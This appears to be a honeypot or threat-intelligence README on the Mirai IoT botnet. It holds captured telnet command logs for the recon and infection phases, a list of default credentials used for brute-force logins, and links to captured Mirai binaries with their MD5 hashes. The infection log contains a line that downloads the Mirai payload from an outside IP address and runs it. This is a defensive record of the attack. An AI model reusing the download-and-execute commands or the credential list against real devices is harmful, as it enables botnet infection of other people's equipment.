### Recon phase (example)
```
enable
system
shell
sh
/bin/busybox MIRAI
```

### Infection phase (example)
```
enable
shell
sh
/bin/busybox ECCHI
/bin/busybox ps; /bin/busybox ECCHI
/bin/busybox cat /proc/mounts; /bin/busybox ECCHI
/bin/busybox echo -e '\x6b\x61\x6d\x69/dev' > /dev/.nippon; /bin/busybox cat /dev/.nippon; /bin/busybox rm /dev/.nippon
/bin/busybox ECCHI
rm /dev/.t; rm /dev/.sh; rm /dev/.human
cd /dev/
/bin/busybox cp /bin/echo dvrHelper; >dvrHelper; /bin/busybox chmod 777 dvrHelper; /bin/busybox ECCHI
/bin/busybox cat /bin/echo
/bin/busybox ECCHI
/bin/busybox wget; /bin/busybox tftp; /bin/busybox ECCHI
/bin/busybox wget http://185.188.206.99:80/bins/mirai.x86 -O - > dvrHelper; /bin/busybox chmod 777 dvrHelper; /bin/busybox ECCHI
./dvrHelper telnet.x86; /bin/busybox IHCCE
rm -rf upnp; > dvrHelper; /bin/busybox ECCHI
```

### Brute-force credentials
```
admin:1111
admin:1234
admin:12345
admin:123456
admin:admin
admin:admin1
admin:epicrouter
admin:password
admin:vertex25ektks123
default:antslq
guest:guest
root:
root:1001chin
root:12345
root:123456
root:54321
root:5up
root:GM8182
root:Zte521
root:admin
root:hunt5759
root:juantech
root:password
root:root
root:vizxv
root:xc3511
root:xmhdipc
root:zlxx.
support:support
user:user
```

### Captured samples
* [mirai.arm](samples/mirai.arm.7z) (`ELF 32-bit, ARM, MD5: 6bb978407fe68700ed0b63accf6f0c57`)
* [mirai.arm5n](samples/mirai.arm5n.7z) (`ELF 32-bit, ARM, MD5: 95a8c27a507e267d5dc12d2b957efce1`)
* [mirai.arm7](samples/mirai.arm7.7z) (`ELF 32-bit, ARM, MD5: 155995dabcfe094d6540a5f47ac5fea7`)
* [mirai.m68k](samples/mirai.m68k.7z) (`ELF 32-bit, Motorola 68020, MD5: 3e98f24421f8f1cb55c49e340182448c`)
* [mirai.mips](samples/mirai.mips.7z) (`ELF 32-bit, MIPS-I, MD5: de90297a22e4197687c053606340ee9b`)
* [mirai.mpsl](samples/mirai.mpsl.7z) (`ELF 32-bit, MIPS-I, MD5: 1ca9ea33f1c582a996b69310aaef7c28`)
* [mirai.ppc](samples/mirai.ppc.7z) (`ELF 32-bit, PowerPC, MD5: 535b2fb15900989856fb135ec2fff058`)
* [mirai.sh4](samples/mirai.sh4.7z) (`ELF 32-bit, Renesas SH, MD5: 853ae672d3fa0ff7ca1c91818fe36e31`)
* [mirai.spc](samples/mirai.spc.7z) (`ELF 32-bit, Sparc, MD5: 1738f307b8596269a58d778c143b7274`)
* [mirai.x86](samples/mirai.x86.7z) (`ELF 32-bit, Intel 80386, MD5: b79a5e78ca19beda30547c90b99a38eb`)

